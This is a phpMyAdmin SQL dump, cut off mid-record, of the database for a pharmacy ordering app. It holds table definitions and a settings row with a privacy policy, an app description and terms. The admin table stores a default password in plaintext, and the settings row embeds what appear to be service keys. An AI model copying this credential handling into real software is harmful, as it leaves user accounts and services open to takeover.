-- phpMyAdmin SQL Dump
-- version 4.6.6deb5ubuntu0.5
-- https://www.phpmyadmin.net/
--
-- Host: localhost:3306
-- Generation Time: Nov 28, 2020 at 09:18 AM
-- Server version: 5.7.32-0ubuntu0.18.04.1
-- PHP Version: 7.2.24-0ubuntu0.18.04.7

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Database: `multidb`
--

-- --------------------------------------------------------

--
-- Table structure for table `admin`
--

CREATE TABLE `admin` (
  `id` int(11) NOT NULL,
  `username` longtext NOT NULL,
  `password` longtext NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `admin`
--

INSERT INTO `admin` (`id`, `username`, `password`) VALUES
(1, 'admin', 'admin@123');

-- --------------------------------------------------------

--
-- Table structure for table `banner`
--

CREATE TABLE `banner` (
  `id` int(11) NOT NULL,
  `img` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `status` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `banner`
--



-- --------------------------------------------------------

--
-- Table structure for table `category`
--

CREATE TABLE `category` (
  `id` int(11) NOT NULL,
  `cat_name` text CHARACTER SET utf8 NOT NULL,
  `cat_status` int(11) NOT NULL,
  `cat_img` text NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `category`
--



-- --------------------------------------------------------

--
-- Table structure for table `payout_setting`
--

CREATE TABLE `payout_setting` (
  `id` int(11) NOT NULL,
  `rid` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `vid` int(11) NOT NULL,
  `amt` int(11) NOT NULL,
  `status` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `proof` text COLLATE utf8mb4_unicode_ci,
  `p_by` text COLLATE utf8mb4_unicode_ci,
  `r_date` datetime NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `payout_setting`
--


-- --------------------------------------------------------

--
-- Table structure for table `rider`
--

CREATE TABLE `rider` (
  `id` int(11) NOT NULL,
  `name` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `mobile` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `email` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `aid` int(11) NOT NULL,
  `address` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `status` int(11) NOT NULL,
  `password` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `reject` int(11) NOT NULL DEFAULT '0',
  `accept` int(11) NOT NULL DEFAULT '0',
  `complete` int(11) NOT NULL DEFAULT '0',
  `a_status` int(11) NOT NULL DEFAULT '1'
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `rider`
--



-- --------------------------------------------------------

--
-- Table structure for table `setting`
--

CREATE TABLE `setting` (
  `id` int(11) NOT NULL,
  `logo` mediumtext NOT NULL,
  `d_title` mediumtext NOT NULL,
  `d_s_title` mediumtext NOT NULL,
  `one_key` mediumtext NOT NULL,
  `one_hash` mediumtext NOT NULL,
  `r_key` text NOT NULL,
  `r_hash` text NOT NULL,
  `s_key` text NOT NULL,
  `s_hash` text NOT NULL,
  `currency` text NOT NULL,
  `timezone` text NOT NULL,
  `policy` text NOT NULL,
  `about` text NOT NULL,
  `contact` text NOT NULL,
  `terms` text NOT NULL,
  `p_limit` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

--
-- Dumping data for table `setting`
--

INSERT INTO `setting` (`id`, `logo`, `d_title`, `d_s_title`, `one_key`, `one_hash`, `r_key`, `r_hash`, `s_key`, `s_hash`, `currency`, `timezone`, `policy`, `about`, `contact`, `terms`, `p_limit`) VALUES
(1, 'assets/img/store.png', 'SuperStore', 'SS', '7e9f37ac-ecab-405a-bff2-a8e1f8c5a8ce', 'YWNiNDE5Y2MtMmMyZC00ZjkxLWJhNDktNTA1NTZmYTE3MTZl', '509eb1eb-14e7-4135-a523-d0e459f37048', 'MzY1MTVlZWYtODZmNC00ZTRiLWIzMDQtMGFhNGM0NGIwM2Zm', 'dd8316c9-4319-4811-b807-1df1801c6dff', 'NWYzZTNhODctZTgxNi00ZWVlLTgwMWYtZmE5NGViOWFmNzFk', '$', 'Asia/Kolkata', '<p><span style=\"box-sizing: inherit; font-weight: 700; color: rgb(54, 54, 54); font-family: BlinkMacSystemFont, -apple-system, \"Segoe UI\", Roboto, Oxygen, Ubuntu, Cantarell, \"Fira Sans\", \"Droid Sans\", \"Helvetica Neue\", Helvetica, Arial, sans-serif; font-size: 16px;\">Privacy Policy</span><span style=\"color: rgb(74, 74, 74); font-family: BlinkMacSystemFont, -apple-system, \"Segoe UI\", Roboto, Oxygen, Ubuntu, Cantarell, \"Fira Sans\", \"Droid Sans\", \"Helvetica Neue\", Helvetica, Arial, sans-serif; font-size: 16px;\"></span></p><p style=\"box-sizing: inherit; margin-right: 0px; margin-bottom: 0px; margin-left: 0px; padding: 0px; color: rgb(74, 74, 74); font-family: BlinkMacSystemFont, -apple-system, \"Segoe UI\", Roboto, Oxygen, Ubuntu, Cantarell, \"Fira Sans\", \"Droid Sans\", \"Helvetica Neue\", Helvetica, Arial, sans-serif; font-size: 16px;\">CSCODETECH.COM built the PharmaFast - Order Medicine and Upload Prescription or Online Healthcare Android App app as a Commercial app. This SERVICE is provided by CSCODETECH.COM and is intended for use as is.</p><p style=\"box-sizing: inherit; margin-right: 0px; margin-bottom: 0px; margin-left: 0px; padding: 0px; color: rgb(74, 74, 74); font-family: BlinkMacSystemFont, -apple-system, \"Segoe UI\", Roboto, Oxygen, Ubuntu, Cantarell, \"Fira Sans\", \"Droid Sans\", \"Helvetica Neue\", Helvetica, Arial, sans-serif; font-size: 16px;\"><br></p><p style=\"box-sizing: inherit; margin-right: 0px; margin-bottom: 0px; margin-left: 0px; padding: 0px; color: rgb(74, 74, 74); font-family: BlinkMacSystemFont, -apple-system, \"Segoe UI\", Roboto, Oxygen, Ubuntu, Cantarell, \"Fira Sans\", \"Droid Sans\", \"Helvetica Neue\", Helvetica, Arial, sans-serif; font-size: 16px;\">This page is used to inform visitors regarding our policies with the collection, use, and disclosure of Personal Information if anyone decided to use our Service.</p><p style=\"box-sizing: inherit; margin-right: 0px; margin-bottom: 0px; margin-left: 0px; padding: 0px; color: rgb(74, 74, 74); font-family: BlinkMacSystemFont, -apple-system, \"Segoe UI\", Roboto, Oxygen, Ubuntu, Cantarell, \"Fira Sans\", \"Droid Sans\", \"Helvetica Neue\", Helvetica, Arial, sans-serif; font-size: 16px;\"><br></p><p style=\"box-sizing: inherit; margin-right: 0px; margin-bottom: 0px; margin-left: 0px; padding: 0px; color: rgb(74, 74, 74); font-family: BlinkMacSystemFont, -apple-system, \"Segoe UI\", Roboto, Oxygen, Ubuntu, Cantarell, \"Fira Sans\", \"Droid Sans\", \"Helvetica Neue\", Helvetica, Arial, sans-serif; font-size: 16px;\">If you choose to use our Service, then you agree to the collection and use of information in relation to this policy. The Personal Information that we collect is used for providing and improving the Service. We will not use or share your information with anyone except as described in this Privacy Policy.</p><p style=\"box-sizing: inherit; margin-right: 0px; margin-bottom: 0px; margin-left: 0px; padding: 0px; color: rgb(74, 74, 74); font-family: BlinkMacSystemFont, -apple-system, \"Segoe UI\", Roboto, Oxygen, Ubuntu, Cantarell, \"Fira Sans\", \"Droid Sans\", \"Helvetica Neue\", Helvetica, Arial, sans-serif; font-size: 16px;\"><br></p><p style=\"box-sizing: inherit; margin-right: 0px; margin-bottom: 0px; margin-left: 0px; padding: 0px; color: rgb(74, 74, 74); font-family: BlinkMacSystemFont, -apple-system, \"Segoe UI\", Roboto, Oxygen, Ubuntu, Cantarell, \"Fira Sans\", \"Droid Sans\", \"Helvetica Neue\", Helvetica, Arial, sans-serif; font-size: 16px;\">The terms used in this Privacy Policy have the same meanings as in our Terms and Conditions, which is accessible at PharmaFast - Order Medicine and Upload Prescription or Online Healthcare Android App unless otherwise defined in this Privacy Policy.</p><p style=\"box-sizing: inherit; margin-right: 0px; margin-bottom: 0px; margin-left: 0px; padding: 0px; color: rgb(74, 74, 74); font-family: BlinkMacSystemFont, -apple-system, \"Segoe UI\", Roboto, Oxygen, Ubuntu, Cantarell, \"Fira Sans\", \"Droid Sans\", \"Helvetica Neue\", Helvetica, Arial, sans-serif; font-size: 16px;\"><br></p><p style=\"box-sizing: inherit; margin-right: 0px; margin-bottom: 0px; margin-left: 0px; padding: 0px; color: rgb(74, 74, 74); font-family: BlinkMacSystemFont, -apple-system, \"Segoe UI\", Roboto, Oxygen, Ubuntu, Cantarell, \"Fira Sans\", \"Droid Sans\", \"Helvetica Neue\", Helvetica, Arial, sans-serif; font-size: 16px;\"><span style=\"box-sizing: inherit; font-weight: 700; color: rgb(54, 54, 54);\">Information Collection and Use</span></p><p style=\"box-sizing: inherit; margin-right: 0px; margin-bottom: 0px; margin-left: 0px; padding: 0px; color: rgb(74, 74, 74); font-family: BlinkMacSystemFont, -apple-system, \"Segoe UI\", Roboto, Oxygen, Ubuntu, Cantarell, \"Fira Sans\", \"Droid Sans\", \"Helvetica Neue\", Helvetica, Arial, sans-serif; font-size: 16px;\"><span style=\"box-sizing: inherit; font-weight: 700; color: rgb(54, 54, 54);\"><br></span></p><p style=\"box-sizing: inherit; margin-right: 0px; margin-bottom: 0px; margin-left: 0px; padding: 0px; color: rgb(74, 74, 74); font-family: BlinkMacSystemFont, -apple-system, \"Segoe UI\", Roboto, Oxygen, Ubuntu, Cantarell, \"Fira Sans\", \"Droid Sans\", \"Helvetica Neue\", Helvetica, Arial, sans-serif; font-size: 16px;\">For a better experience, while using our Service, we may require you to provide us with certain personally identifiable information. The information that we request will be retained by us and used as described in this privacy policy.</p><div style=\"box-sizing: inherit; color: rgb(74, 74, 74); font-family: BlinkMacSystemFont, -apple-system, \"Segoe UI\", Roboto, Oxygen, Ubuntu, Cantarell, \"Fira Sans\", \"Droid Sans\", \"Helvetica Neue\", Helvetica, Arial, sans-serif; font-size: 16px;\"><p style=\"box-sizing: inherit; margin-right: 0px; margin-bottom: 0px; margin-left: 0px; padding: 0px;\">The app does use third party services that may collect information used to identify you.</p><p style=\"box-sizing: inherit; margin-right: 0px; margin-bottom: 0px; margin-left: 0px; padding: 0px;\">Link to privacy policy of third party service providers used by the app</p><ul style=\"box-sizing: inherit; margin-right: 0px; margin-bottom: 0px; margin-left: 0px; padding: 0px; list-style-position: initial; list-style-image: initial;\"><li style=\"box-sizing: inherit; margin: 10px 10px 10px 2.5em; padding: 0px;\"><a href=\"https://www.google.com/policies/privacy/\" target=\"_blank\" rel=\"noopener noreferrer\" style=\"box-sizing: inherit; color: rgb(50, 115, 220); cursor: pointer;\">Google Play Services</a></li></ul><p style=\"box-sizing: inherit; margin: 10px 10px 10px 2.5em; padding: 0px;\"><br></p><p style=\"box-sizing: inherit; margin: 10px 10px 10px 2.5em; padding: 0px;\"><br></p></div><p style=\"box-sizing: inherit; margin-right: 0px; margin-bottom: 0px; margin-left: 0px; padding: 0px; color: rgb(74, 74, 74); font-family: BlinkMacSystemFont, -apple-system, \"Segoe UI\", Roboto, Oxygen, Ubuntu, Cantarell, \"Fira Sans\", \"Droid Sans\", \"Helvetica Neue\", Helvetica, Arial, sans-serif; font-size: 16px;\"><span style=\"box-sizing: inherit; font-weight: 700; color: rgb(54, 54, 54);\">Log Data</span></p><p style=\"box-sizing: inherit; margin-right: 0px; margin-bottom: 0px; margin-left: 0px; padding: 0px; color: rgb(74, 74, 74); font-family: BlinkMacSystemFont, -apple-system, \"Segoe UI\", Roboto, Oxygen, Ubuntu, Cantarell, \"Fira Sans\", \"Droid Sans\", \"Helvetica Neue\", Helvetica, Arial, sans-serif; font-size: 16px;\"><span style=\"box-sizing: inherit; font-weight: 700; color: rgb(54, 54, 54);\"><br></span></p><p style=\"box-sizing: inherit; margin-right: 0px; margin-bottom: 0px; margin-left: 0px; padding: 0px; color: rgb(74, 74, 74); font-family: BlinkMacSystemFont, -apple-system, \"Segoe UI\", Roboto, Oxygen, Ubuntu, Cantarell, \"Fira Sans\", \"Droid Sans\", \"Helvetica Neue\", Helvetica, Arial, sans-serif; font-size: 16px;\">We want to inform you that whenever you use our Service, in a case of an error in the app we collect data and information (through third party products) on your phone called Log Data. This Log Data may include information such as your device Internet Protocol (“IP”) address, device name, operating system version, the configuration of the app when utilizing our Service, the time and date of your use of the Service, and other statistics.</p><p style=\"box-sizing: inherit; margin-right: 0px; margin-bottom: 0px; margin-left: 0px; padding: 0px; color: rgb(74, 74, 74); font-family: BlinkMacSystemFont, -apple-system, \"Segoe UI\", Roboto, Oxygen, Ubuntu, Cantarell, \"Fira Sans\", \"Droid Sans\", \"Helvetica Neue\", Helvetica, Arial, sans-serif; font-size: 16px;\"><br></p><p style=\"box-sizing: inherit; margin-right: 0px; margin-bottom: 0px; margin-left: 0px; padding: 0px; color: rgb(74, 74, 74); font-family: BlinkMacSystemFont, -apple-system, \"Segoe UI\", Roboto, Oxygen, Ubuntu, Cantarell, \"Fira Sans\", \"Droid Sans\", \"Helvetica Neue\", Helvetica, Arial, sans-serif; font-size: 16px;\"><span style=\"box-sizing: inherit; font-weight: 700; color: rgb(54, 54, 54);\">Cookies</span></p><p style=\"box-sizing: inherit; margin-right: 0px; margin-bottom: 0px; margin-left: 0px; padding: 0px; color: rgb(74, 74, 74); font-family: BlinkMacSystemFont, -apple-system, \"Segoe UI\", Roboto, Oxygen, Ubuntu, Cantarell, \"Fira Sans\", \"Droid Sans\", \"Helvetica Neue\", Helvetica, Arial, sans-serif; font-size: 16px;\"><span style=\"box-sizing: inherit; font-weight: 700; color: rgb(54, 54, 54);\"><br></span></p><p style=\"box-sizing: inherit; margin-right: 0px; margin-bottom: 0px; margin-left: 0px; padding: 0px; color: rgb(74, 74, 74); font-family: BlinkMacSystemFont, -apple-system, \"Segoe UI\", Roboto, Oxygen, Ubuntu, Cantarell, \"Fira Sans\", \"Droid Sans\", \"Helvetica Neue\", Helvetica, Arial, sans-serif; font-size: 16px;\">Cookies are files with a small amount of data that are commonly used as anonymous unique identifiers. These are sent to your browser from the websites that you visit and are stored on your device\'s internal memory.</p><p style=\"box-sizing: inherit; margin-right: 0px; margin-bottom: 0px; margin-left: 0px; padding: 0px; color: rgb(74, 74, 74); font-family: BlinkMacSystemFont, -apple-system, \"Segoe UI\", Roboto, Oxygen, Ubuntu, Cantarell, \"Fira Sans\", \"Droid Sans\", \"Helvetica Neue\", Helvetica, Arial, sans-serif; font-size: 16px;\">This Service does not use these “cookies” explicitly. However, the app may use third party code and libraries that use “cookies” to collect information and improve their services. You have the option to either accept or refuse these cookies and know when a cookie is being sent to your device. If you choose to refuse our cookies, you may not be able to use some portions of this Service.</p><p style=\"box-sizing: inherit; margin-right: 0px; margin-bottom: 0px; margin-left: 0px; padding: 0px; color: rgb(74, 74, 74); font-family: BlinkMacSystemFont, -apple-system, \"Segoe UI\", Roboto, Oxygen, Ubuntu, Cantarell, \"Fira Sans\", \"Droid Sans\", \"Helvetica Neue\", Helvetica, Arial, sans-serif; font-size: 16px;\"><br></p><p style=\"box-sizing: inherit; margin-right: 0px; margin-bottom: 0px; margin-left: 0px; padding: 0px; color: rgb(74, 74, 74); font-family: BlinkMacSystemFont, -apple-system, \"Segoe UI\", Roboto, Oxygen, Ubuntu, Cantarell, \"Fira Sans\", \"Droid Sans\", \"Helvetica Neue\", Helvetica, Arial, sans-serif; font-size: 16px;\"><span style=\"box-sizing: inherit; font-weight: 700; color: rgb(54, 54, 54);\">Service Providers</span></p><p style=\"box-sizing: inherit; margin-right: 0px; margin-bottom: 0px; margin-left: 0px; padding: 0px; color: rgb(74, 74, 74); font-family: BlinkMacSystemFont, -apple-system, \"Segoe UI\", Roboto, Oxygen, Ubuntu, Cantarell, \"Fira Sans\", \"Droid Sans\", \"Helvetica Neue\", Helvetica, Arial, sans-serif; font-size: 16px;\">We may employ third-party companies and individuals due to the following reasons:</p><ul style=\"box-sizing: inherit; margin-right: 0px; margin-bottom: 0px; margin-left: 0px; padding: 0px; list-style-position: initial; list-style-image: initial; color: rgb(74, 74, 74); font-family: BlinkMacSystemFont, -apple-system, \"Segoe UI\", Roboto, Oxygen, Ubuntu, Cantarell, \"Fira Sans\", \"Droid Sans\", \"Helvetica Neue\", Helvetica, Arial, sans-serif; font-size: 16px;\"><li style=\"box-sizing: inherit; margin: 10px 10px 10px 2.5em; padding: 0px;\">To facilitate our Service;</li><li style=\"box-sizing: inherit; margin: 10px 10px 10px 2.5em; padding: 0px;\">To provide the Service on our behalf;</li><li style=\"box-sizing: inherit; margin: 10px 10px 10px 2.5em; padding: 0px;\">To perform Service-related services; or</li><li style=\"box-sizing: inherit; margin: 10px 10px 10px 2.5em; padding: 0px;\">To assist us in analyzing how our Service is used.</li></ul><p style=\"box-sizing: inherit; margin-right: 0px; margin-bottom: 0px; margin-left: 0px; padding: 0px; color: rgb(74, 74, 74); font-family: BlinkMacSystemFont, -apple-system, \"Segoe UI\", Roboto, Oxygen, Ubuntu, Cantarell, \"Fira Sans\", \"Droid Sans\", \"Helvetica Neue\", Helvetica, Arial, sans-serif; font-size: 16px;\">We want to inform users of this Service that these third parties have access to your Personal Information. The reason is to perform the tasks assigned to them on our behalf. However, they are obligated not to disclose or use the information for any other purpose.</p><p style=\"box-sizing: inherit; margin-right: 0px; margin-bottom: 0px; margin-left: 0px; padding: 0px; color: rgb(74, 74, 74); font-family: BlinkMacSystemFont, -apple-system, \"Segoe UI\", Roboto, Oxygen, Ubuntu, Cantarell, \"Fira Sans\", \"Droid Sans\", \"Helvetica Neue\", Helvetica, Arial, sans-serif; font-size: 16px;\"><br></p><p style=\"box-sizing: inherit; margin-right: 0px; margin-bottom: 0px; margin-left: 0px; padding: 0px; color: rgb(74, 74, 74); font-family: BlinkMacSystemFont, -apple-system, \"Segoe UI\", Roboto, Oxygen, Ubuntu, Cantarell, \"Fira Sans\", \"Droid Sans\", \"Helvetica Neue\", Helvetica, Arial, sans-serif; font-size: 16px;\"><span style=\"box-sizing: inherit; font-weight: 700; color: rgb(54, 54, 54);\">Security</span></p><p style=\"box-sizing: inherit; margin-right: 0px; margin-bottom: 0px; margin-left: 0px; padding: 0px; color: rgb(74, 74, 74); font-family: BlinkMacSystemFont, -apple-system, \"Segoe UI\", Roboto, Oxygen, Ubuntu, Cantarell, \"Fira Sans\", \"Droid Sans\", \"Helvetica Neue\", Helvetica, Arial, sans-serif; font-size: 16px;\">We value your trust in providing us your Personal Information, thus we are striving to use commercially acceptable means of protecting it. But remember that no method of transmission over the internet, or method of electronic storage is 100% secure and reliable, and we cannot guarantee its absolute security.</p><p style=\"box-sizing: inherit; margin-right: 0px; margin-bottom: 0px; margin-left: 0px; padding: 0px; color: rgb(74, 74, 74); font-family: BlinkMacSystemFont, -apple-system, \"Segoe UI\", Roboto, Oxygen, Ubuntu, Cantarell, \"Fira Sans\", \"Droid Sans\", \"Helvetica Neue\", Helvetica, Arial, sans-serif; font-size: 16px;\"><br></p><p style=\"box-sizing: inherit; margin-right: 0px; margin-bottom: 0px; margin-left: 0px; padding: 0px; color: rgb(74, 74, 74); font-family: BlinkMacSystemFont, -apple-system, \"Segoe UI\", Roboto, Oxygen, Ubuntu, Cantarell, \"Fira Sans\", \"Droid Sans\", \"Helvetica Neue\", Helvetica, Arial, sans-serif; font-size: 16px;\"><span style=\"box-sizing: inherit; font-weight: 700; color: rgb(54, 54, 54);\">Links to Other Sites</span></p><p style=\"box-sizing: inherit; margin-right: 0px; margin-bottom: 0px; margin-left: 0px; padding: 0px; color: rgb(74, 74, 74); font-family: BlinkMacSystemFont, -apple-system, \"Segoe UI\", Roboto, Oxygen, Ubuntu, Cantarell, \"Fira Sans\", \"Droid Sans\", \"Helvetica Neue\", Helvetica, Arial, sans-serif; font-size: 16px;\">This Service may contain links to other sites. If you click on a third-party link, you will be directed to that site. Note that these external sites are not operated by us. Therefore, we strongly advise you to review the Privacy Policy of these websites. We have no control over and assume no responsibility for the content, privacy policies, or practices of any third-party sites or services.</p><p style=\"box-sizing: inherit; margin-right: 0px; margin-bottom: 0px; margin-left: 0px; padding: 0px; color: rgb(74, 74, 74); font-family: BlinkMacSystemFont, -apple-system, \"Segoe UI\", Roboto, Oxygen, Ubuntu, Cantarell, \"Fira Sans\", \"Droid Sans\", \"Helvetica Neue\", Helvetica, Arial, sans-serif; font-size: 16px;\"><br></p><p style=\"box-sizing: inherit; margin-right: 0px; margin-bottom: 0px; margin-left: 0px; padding: 0px; color: rgb(74, 74, 74); font-family: BlinkMacSystemFont, -apple-system, \"Segoe UI\", Roboto, Oxygen, Ubuntu, Cantarell, \"Fira Sans\", \"Droid Sans\", \"Helvetica Neue\", Helvetica, Arial, sans-serif; font-size: 16px;\"><span style=\"box-sizing: inherit; font-weight: 700; color: rgb(54, 54, 54);\">Children’s Privacy</span></p><p style=\"box-sizing: inherit; margin-right: 0px; margin-bottom: 0px; margin-left: 0px; padding: 0px; color: rgb(74, 74, 74); font-family: BlinkMacSystemFont, -apple-system, \"Segoe UI\", Roboto, Oxygen, Ubuntu, Cantarell, \"Fira Sans\", \"Droid Sans\", \"Helvetica Neue\", Helvetica, Arial, sans-serif; font-size: 16px;\">These Services do not address anyone under the age of 13. We do not knowingly collect personally identifiable information from children under 13. In the case we discover that a child under 13 has provided us with personal information, we immediately delete this from our servers. If you are a parent or guardian and you are aware that your child has provided us with personal information, please contact us so that we will be able to do necessary actions.</p><p style=\"box-sizing: inherit; margin-right: 0px; margin-bottom: 0px; margin-left: 0px; padding: 0px; color: rgb(74, 74, 74); font-family: BlinkMacSystemFont, -apple-system, \"Segoe UI\", Roboto, Oxygen, Ubuntu, Cantarell, \"Fira Sans\", \"Droid Sans\", \"Helvetica Neue\", Helvetica, Arial, sans-serif; font-size: 16px;\"><br></p><p style=\"box-sizing: inherit; margin-right: 0px; margin-bottom: 0px; margin-left: 0px; padding: 0px; color: rgb(74, 74, 74); font-family: BlinkMacSystemFont, -apple-system, \"Segoe UI\", Roboto, Oxygen, Ubuntu, Cantarell, \"Fira Sans\", \"Droid Sans\", \"Helvetica Neue\", Helvetica, Arial, sans-serif; font-size: 16px;\"><span style=\"box-sizing: inherit; font-weight: 700; color: rgb(54, 54, 54);\">Changes to This Privacy Policy</span></p><p style=\"box-sizing: inherit; margin-right: 0px; margin-bottom: 0px; margin-left: 0px; padding: 0px; color: rgb(74, 74, 74); font-family: BlinkMacSystemFont, -apple-system, \"Segoe UI\", Roboto, Oxygen, Ubuntu, Cantarell, \"Fira Sans\", \"Droid Sans\", \"Helvetica Neue\", Helvetica, Arial, sans-serif; font-size: 16px;\">We may update our Privacy Policy from time to time. Thus, you are advised to review this page periodically for any changes. We will notify you of any changes by posting the new Privacy Policy on this page.</p><p style=\"box-sizing: inherit; margin-right: 0px; margin-bottom: 0px; margin-left: 0px; padding: 0px; color: rgb(74, 74, 74); font-family: BlinkMacSystemFont, -apple-system, \"Segoe UI\", Roboto, Oxygen, Ubuntu, Cantarell, \"Fira Sans\", \"Droid Sans\", \"Helvetica Neue\", Helvetica, Arial, sans-serif; font-size: 16px;\">This policy is effective as of 2020-10-01</p><p style=\"box-sizing: inherit; margin-right: 0px; margin-bottom: 0px; margin-left: 0px; padding: 0px; color: rgb(74, 74, 74); font-family: BlinkMacSystemFont, -apple-system, \"Segoe UI\", Roboto, Oxygen, Ubuntu, Cantarell, \"Fira Sans\", \"Droid Sans\", \"Helvetica Neue\", Helvetica, Arial, sans-serif; font-size: 16px;\"><br></p><p style=\"box-sizing: inherit; margin-right: 0px; margin-bottom: 0px; margin-left: 0px; padding: 0px; color: rgb(74, 74, 74); font-family: BlinkMacSystemFont, -apple-system, \"Segoe UI\", Roboto, Oxygen, Ubuntu, Cantarell, \"Fira Sans\", \"Droid Sans\", \"Helvetica Neue\", Helvetica, Arial, sans-serif; font-size: 16px;\"><span style=\"box-sizing: inherit; font-weight: 700; color: rgb(54, 54, 54);\">Contact Us</span></p><p style=\"box-sizing: inherit; margin-right: 0px; margin-bottom: 0px; margin-left: 0px; padding: 0px; color: rgb(74, 74, 74); font-family: BlinkMacSystemFont, -apple-system, \"Segoe UI\", Roboto, Oxygen, Ubuntu, Cantarell, \"Fira Sans\", \"Droid Sans\", \"Helvetica Neue\", Helvetica, Arial, sans-serif; font-size: 16px;\">If you have any questions or suggestions about our Privacy Policy, do not hesitate to contact us at cscodetechuser@gmail.com.</p>', '<p><b>PharmaFast - Order Medicine and Upload Prescription or Online Healthcare Android App</b></p><p><b><br></b></p><p><b>Description:</b></p><p><b>PharmaFast is a one stop shop for order online medicine, medical equipment online, OTC products and Upload Prescription Online healthcare products. PharmaFast brings to you a wide range of genuine healthcare products that are obtained directly from authorized shopes. PharmaFast a complete health app for all your medical needs. </b></p><p><br></p><ul style=\"margin-bottom: 30px; padding-left: 15px; color: rgb(51, 51, 51); font-family: \"Helvetica Neue\", Helvetica, Arial, sans-serif; font-size: 16px;\"><li style=\"margin-bottom: 10px;\"><strong style=\"font-weight: bold;\">Medicine orders: </strong>You can use the PharmaFast app to order medicines online.</li><strong style=\"font-weight: bold;\">Upload Prescription(Order with Prescription): </strong>Upload valid Prescription(jpg or png require a valid prescription) then if shop owner have describe medicine you Receive a Notification and Delivery at your door step.<li style=\"margin-bottom: 10px;\"><strong style=\"font-weight: bold;\">Category: </strong>A variety of category with image like fitness & nutritional products, personal care, healthcare & diabetes care products etc easy and quick manage.</li><li style=\"margin-bottom: 10px;\"><strong style=\"font-weight: bold;\">Brands:</strong>Manage Products from brands like Dabur, Himalaya, Piramal, Pediasure, HealthVit, SBL Homeopathy, Baidyanath, Patanjali, Nestle & more.</li><li style=\"margin-bottom: 10px;\"><strong style=\"font-weight: bold;\">Coupon Code/ Promo Code: </strong>You can generate specific coupons for customer benifits.(5% to 25% discount on online orders to encourage customers to buy more).</li><li style=\"margin-bottom: 10px;\"><strong style=\"font-weight: bold;\">Pin Code Or Geo Location: </strong>Pin code based you can manage products. Each Pincode you can add specific delivery charges. Customer can easy sign up with app using GEO location.</li><li style=\"margin-bottom: 10px;\"><strong style=\"font-weight: bold;\">Quick Add Medicine or Product: </strong>Add medicine with multiple images, Medicine title, Medicine Status, Medicine Category, Medicine Brand, Pin code(which area or pincode or postal code required for avaiable product or not), Medicine Description etc.</li><li style=\"margin-bottom: 10px;\"><strong style=\"font-weight: bold;\">Payment Gateway: </strong>Multi useful payment gateway list for customer options like COD(Cash on Delivery), Razorpay, PayPal, Stripe (More Payment Gateway Coming Soon).</li><li style=\"margin-bottom: 10px;\"><strong style=\"font-weight: bold;\">Order(Medicine & Prescription): </strong>User order product information with Order print. Order management with specific order status change(Approve or Reject, Make Processing, On Route and Complete)</li><li style=\"margin-bottom: 10px;\"><strong style=\"font-weight: bold;\">Testimonial</strong>: Your all happy customer feedback you can manage.</li><li style=\"margin-bottom: 10px;\"><strong style=\"font-weight: bold;\">Country code:</strong> You can manage all world wide country code.(Required for firebase OTP functionality).</li><li style=\"margin-bottom: 10px;\"><strong style=\"font-weight: bold;\">Setting: </strong>Admin username/password, Website Name, Timezone, Logo/Favicon, Currency Setting, About us, Contact us, Privacy Policy and Terms & Conditions you can manage.</li><li style=\"margin-bottom: 10px;\"><strong style=\"font-weight: bold;\">Notification: </strong>Each order status change(Approve or Reject, Make Processing, On Route and Complete) user get notification with creative process information image.</li><li style=\"margin-bottom: 10px;\"><strong style=\"font-weight: bold;\">Dashboard: </strong>High end Statics and Order related information.</li></ul>', '<p>Address Shop Number 67 68 69 Ground Floor Apple World Shopping Center, CA, 988852</p><p><br></p><p><br></p><p>WhatsApp or Call: +917276465975</p><p><br></p><p><br></p><p>Skype: cscodetech</p>', '<p><span style=\"box-sizing: inherit; font-weight: 700; color: rgb(54, 54, 54); font-family: BlinkMacSystemFont, -apple-system, \"Segoe UI\", Roboto, Oxygen, Ubuntu, Cantarell, \"Fira Sans\", \"Droid Sans\", \"Helvetica Neue\", Helvetica, Arial, sans-serif; font-size: 16px;\">Terms & Conditions</span><span style=\"color: rgb(74, 74, 74); font-family: BlinkMacSystemFont, -apple-system, \"Segoe UI\", Roboto, Oxygen, Ubuntu, Cantarell, \"Fira Sans\", \"Droid Sans\", \"Helvetica Neue\", Helvetica, Arial, sans-serif; font-size: 16px;\"></span></p><p style=\"box-sizing: inherit; margin-right: 0px; margin-bottom: 0px; margin-left: 0px; padding: 0px; color: rgb(74, 74, 74); font-family: BlinkMacSystemFont, -apple-system, \"Segoe UI\", Roboto, Oxygen, Ubuntu, Cantarell, \"Fira Sans\", \"Droid Sans\", \"Helvetica Neue\", Helvetica, Arial, sans-serif; font-size: 16px;\">By downloading or using the app, these terms will automatically apply to you – you should make sure therefore that you read them carefully before using the app. You’re not allowed to copy, or modify the app, any part of the app, or our trademarks in any way. You’re not allowed to attempt to extract the source code of the app, and you also shouldn’t try to translate the app into other languages, or make derivative versions. The app itself, and all the trade marks, copyright, database rights and other intellectual property rights related to it, still belong to CSCODETECH.COM.</p><p style=\"box-sizing: inherit; margin-right: 0px; margin-bottom: 0px; margin-left: 0px; padding: 0px; color: rgb(74, 74, 74); font-family: BlinkMacSystemFont, -apple-system, \"Segoe UI\", Roboto, Oxygen, Ubuntu, Cantarell, \"Fira Sans\", 